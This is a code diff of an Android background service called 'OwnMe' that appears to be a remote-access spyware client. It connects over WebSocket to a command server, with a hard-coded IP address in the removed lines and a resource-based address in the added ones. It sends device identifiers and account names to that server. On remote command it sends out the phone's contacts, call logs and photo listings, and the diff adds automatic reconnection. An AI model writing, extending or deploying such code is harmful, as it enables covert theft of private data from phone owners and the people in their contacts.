@@ -10,38 +10,33 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
-import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
+import android.net.Uri;
 import android.os.BatteryManager;
 import android.os.Build;
-import android.os.Environment;
 import android.os.IBinder;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
+import android.provider.MediaStore;
 import android.support.annotation.Nullable;
 import android.support.v4.app.ActivityCompat;
 import android.telephony.TelephonyManager;
-import android.util.Base64;
 import android.util.Log;
 import android.widget.Toast;
 
 import org.java_websocket.client.WebSocketClient;
 import org.java_websocket.handshake.ServerHandshake;
+import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import java.io.ByteArrayOutputStream;
-import java.io.File;
 import java.net.URI;
 import java.net.URISyntaxException;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.Timer;
 import java.util.TimerTask;
-
-import static android.R.attr.name;
 
 /**
  * Created by earthshakira on 26/1/17.
@@ -52,16 +47,31 @@ public class OwnMe extends Service {
     private String android_id, dev_name;
     private String username;
     private Timer pingpong;
+    private Timer retryHarder;
     boolean webopen = false;
     JSONObject ping;
-
+    JSONObject handshake;
+    private Intent savedIntent;
     @Nullable
     @Override
     public IBinder onBind(Intent intent) {
         return null;
     }
 
-
+    public void retryLater(){
+        retryHarder.cancel();
+        retryHarder.purge();
+        retryHarder=new Timer();
+        retryHarder.scheduleAtFixedRate(new TimerTask() {
+            @Override
+            public void run() {
+                Log.d("Timer Running", "trying for socket");
+                if (!webopen) {
+                  connectWebSocket();
+                }
+            }
+        },new Date(new Date().getTime()+5000),5000);
+    }
     public String getNetworkState() {
         ConnectivityManager cm =
                 (ConnectivityManager) this.getBaseContext().getSystemService(Context.CONNECTIVITY_SERVICE);
@@ -93,16 +103,27 @@ public class OwnMe extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        savedIntent=intent;
         Toast.makeText(this, "Service Started", Toast.LENGTH_LONG).show();
         pingpong = new Timer();
-        username = "super_admin";
+        retryHarder = new Timer();
+        username = getString(R.string.user_name);
         TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-        android_id = telephonyManager.getDeviceId();
+        android_id = "355004054484712   ";//telephonyManager.getDeviceId();
         dev_name = Build.MANUFACTURER + " " + Build.MODEL;
+        int sdkVersion = android.os.Build.VERSION.SDK_INT; // e.g. sdkVersion := 8;
         ping = new JSONObject();
+        handshake = new JSONObject();
         try {
             ping.put("type", "ping");
             ping.put("id", android_id);
+            handshake.put("type","handshake");
+            handshake.put("user",username);
+            handshake.put("id",android_id);
+            handshake.put("devname",dev_name);
+            handshake.put("devuser",getUsername());
+            handshake.put("connection",getNetworkState());
+            handshake.put("api",sdkVersion);
         } catch (JSONException e) {
             e.printStackTrace();
         }
@@ -123,20 +144,21 @@ public class OwnMe extends Service {
     private void connectWebSocket() {
         URI uri;
         try {
-                      uri = new URI("ws://43.228.237.131:8080");
-            //uri = new URI("ws://192.168.0.101:8080");
+            uri = new URI("ws://"+getString(R.string.ip)+":"+getString(R.string.port));
         } catch (URISyntaxException e) {
             e.printStackTrace();
             return;
         }
-        Toast.makeText(this.getBaseContext(), " Tying to open ", Toast.LENGTH_LONG).show();
+        //Toast.makeText(this.getBaseContext(), " Tying to open ", Toast.LENGTH_LONG).show();
         mWebSocketClient = new WebSocketClient(uri) {
             @Override
             public void onOpen(ServerHandshake serverHandshake) {
                 Log.i("Websocket", "Opened");
-                mWebSocketClient.send("{\"type\":\"handshake\",\"user\":\"" + username + "\",\"id\":\"" + android_id + "\",\"devname\":\"" + dev_name + "\",\"devuser\":\"" + getUsername() + "\",\"connection\":\"" + getNetworkState() + "\"}");
+                mWebSocketClient.send(handshake.toString());
                 webopen = true;
-
+                retryHarder.cancel();
+                retryHarder.purge();
+                pingpong = new Timer(   );
                 pingpong.scheduleAtFixedRate(new TimerTask() {
                     @Override
                     public void run() {
@@ -156,45 +178,51 @@ public class OwnMe extends Service {
             public void onMessage(String s) {
 
                 Log.d("shubham", "onMessage: " + s);
-
+                JSONObject x = null;
+                String cmd=null;
                 try {
+                    x=new JSONObject(s);
                     Log.d("shubham", "onMessage: inside try");
-                    JSONObject x = new JSONObject(s);
                     Log.d("shubham", "onMessage: " + x.get("cmd"));
-                    if (x.get("cmd").toString().equals("screenshot")) {
-                        x.put("to", x.get("from"));
+                    x.put("to", x.get("from"));
+                    x.remove("from");
+                    cmd=x.get("cmd").toString();
+                    if (cmd.equals("screenshot")) {
                         x.put("response", "none");
-                        x.remove("from");
                         x.put("type", "response");
-                        mWebSocketClient.send(x.toString());
-                        Log.d("shubham", "onMessage: " + x.get("cmd"));
-                    } else if (x.get("cmd").toString().equals("contacts")) {
-                        x.put("to", x.get("from"));
+                    } else if (cmd.equals("contacts")) {
                         x.put("response", getContacts());
-                        x.remove("from");
                         x.put("type", "contacts");
-                        mWebSocketClient.send(x.toString());
-                    }else if (x.get("cmd").toString().equals("calllog")) {
-                        x.put("to", x.get("from"));
+                    }else if (cmd.equals("calllog")) {
                         x.put("response", getCallLogs());
-                        x.remove("from");
                         x.put("type", "calllog");
-                        mWebSocketClient.send(x.toString());
-                    } else if (x.get("cmd").toString().equals("gallery")) {
-                        x.put("to", x.get("from"));
-                        x.put("response", getGallery());
-                        x.remove("from");
-                        x.put("type", "gallery");
-                        mWebSocketClient.send(x.toString());
-                    } else {
+                    } else if (cmd.equals("gallery")) {
+                        ArrayList gal = getGallery();
+                        JSONObject y;
+                        int pg=gal.size();
+                        y=new JSONObject();
+                        y.put("to",x.get("to"));
+                        for(int i=0;i<pg;i++){
+                            y.put("response", gal.get(i).toString());
+                            y.put("type", "gallery");
+                            y.put("id",android_id);
+                            y.put("page",i+1);
+                            y.put("total",pg);
+                            mWebSocketClient.send(y.toString());
+                        }
+                    } else if(cmd.equals("file")){
+
+                    }else {
+                        x.put("type","error");
+                        x.put("response","no command found");
                         Log.d("shubham", "no commans found");
                     }
                 } catch (JSONException e) {
                     Log.d("shubham", "onMessage: inside catch");
                     e.printStackTrace();
-
                 }
-
+                if(!cmd.equals("gallery"))
+                    mWebSocketClient.send(x.toString());
             }
 
             @Override
@@ -203,15 +231,12 @@ public class OwnMe extends Service {
                 webopen = false;
                 pingpong.cancel();
                 pingpong.purge();
-
+                retryLater();
             }
 
             @Override
             public void onError(Exception e) {
                 webopen = false;
-                pingpong.cancel();
-                pingpong.purge();
-
                 Log.i("Websocket", "Error " + e.getMessage());
             }
         };
@@ -347,38 +372,40 @@ public class OwnMe extends Service {
         }
 
     }
-    private String getGallery(){
-        String str="";
-        File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
-        File yourDir = new File(dir,"/Camera/");
-        Log.d("Shubham",""+yourDir.listFiles());
-        JSONObject x = new JSONObject();
-        int counter =0 ;
-        for (File f : yourDir.listFiles()) {
-            if (f.isFile())
-            {
-                String name = f.getName();
-                if(counter<3) {
-                    counter++;
-                    File img = new File(dir, "/Camera/" + name);
-                    Bitmap bm = BitmapFactory.decodeFile(img.getAbsolutePath());
-                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                    bm.compress(Bitmap.CompressFormat.JPEG, 20, baos); //bm is the bitmap object
+    private ArrayList<JSONArray> getGallery(){
 
-                    String encodedImage = Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT);
-                    try {
-                        x.put(("img"+counter),encodedImage);
-                    } catch (JSONException e) {
-                        e.printStackTrace();
+            Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+
+            String [] projection = { MediaStore.MediaColumns.DATA , MediaStore.Images.Media.BUCKET_DISPLAY_NAME};
+            Cursor imageCursor = getContentResolver().query(uri, projection, null, null, null);
+
+            int columnIndexOfData = imageCursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
+            int columnIndexOfFolderName = imageCursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
+            //ArrayList<JSONObject> lister= new ArrayList<>();
+            String singlePath, s,folderName;
+            int num=0;
+            ArrayList<JSONArray> ret =new ArrayList<>();
+            JSONArray page=new JSONArray();
+            JSONObject x=new JSONObject();
+            while(imageCursor.moveToNext()){
+                singlePath = imageCursor.getString(columnIndexOfData);
+                folderName = imageCursor.getString(columnIndexOfFolderName);
+                try {
+                    x=new JSONObject();
+                    x.put("path",singlePath);
+                    x.put("folder",folderName);
+                    x.put("page",num/20+1);
+                    page.put(x);
+                    if(num!= 0 && (num +1) % 20 == 0){
+                        ret.add(page);
+                        page=new JSONArray();
                     }
-                    Log.d("Shubham", "fileencoded" +encodedImage);
+                } catch (JSONException e) {
+                    e.printStackTrace();
                 }
-
+                num++;
             }
-            Log.d("Shubham", "filenames" + name);
-
-        }
-
-        return x.toString();
+            return ret;
     }
+
 }
